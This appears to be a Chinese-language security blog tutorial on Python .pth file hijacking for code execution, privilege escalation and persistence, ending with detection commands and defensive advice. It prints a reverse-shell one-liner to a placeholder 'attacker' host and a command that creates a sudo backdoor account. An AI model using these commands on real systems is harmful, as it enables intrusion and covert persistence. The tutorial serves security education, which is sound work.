---
title: Python.pth 劫持原理与利用
date: 2026-06-18 20:55:19
tags:
- Python
- 权限提升
- 内网渗透
---

## 什么是 .pth 文件

Python 启动时会自动加载 `site-packages` 目录下所有 `.pth` 文件，把文件中的路径添加到 `sys.path`。

```python
# 在 site-packages 下放一个任意命名的 .pth 文件
# 内容：
/tmp/my_module
```

这样 `/tmp/my_module` 就会被加入模块搜索路径。

## 劫持原理

更危险的是，`.pth` 文件可以写 Python 代码：

```python
# import 后面的代码会在 Python 启动时自动执行
import os; os.system('whoami > /tmp/pwned')
```

Python 导入 `site` 模块时会逐行执行 `.pth` 中的内容，以 `import` 开头的行会被当成代码执行。

## 利用场景

### 场景一：写文件权限拿下 Python 环境

```bash
# 目标目录：site-packages
python3 -c "import site; print(site.getsitepackages())"
# 输出：['/usr/lib/python3/dist-packages', '/usr/lib/python3/site-packages']

# 写入恶意 .pth
echo 'import os; os.system("bash -i >& /dev/tcp/attacker/4444 0>&1")' > /usr/lib/python3/site-packages/evil.pth
```

下次任何用户执行 `python3`，都会触发反弹 Shell。

### 场景二：配合文件上传漏洞

如果 Web 应用允许上传文件到 `site-packages` 目录，上传一个 `.pth` 文件即可 RCE。

### 场景三：权限维持

```bash
# 添加后门用户
echo 'import os; os.system("useradd -G sudo backdoor && echo backdoor:pass | chpasswd")' > /usr/lib/python3/site-packages/.sys.pth
```

## 检测与防御

```bash
# 检查 site-packages 下的 .pth 文件
find /usr -name "*.pth" -type f 2>/dev/null

# 检查可疑的 import 语句
grep -r "^import\|^from" /usr/lib/python3*/site-packages/*.pth 2>/dev/null
```

防御：`site-packages` 目录不应允许普通用户写入，监控 `.pth` 文件变更。
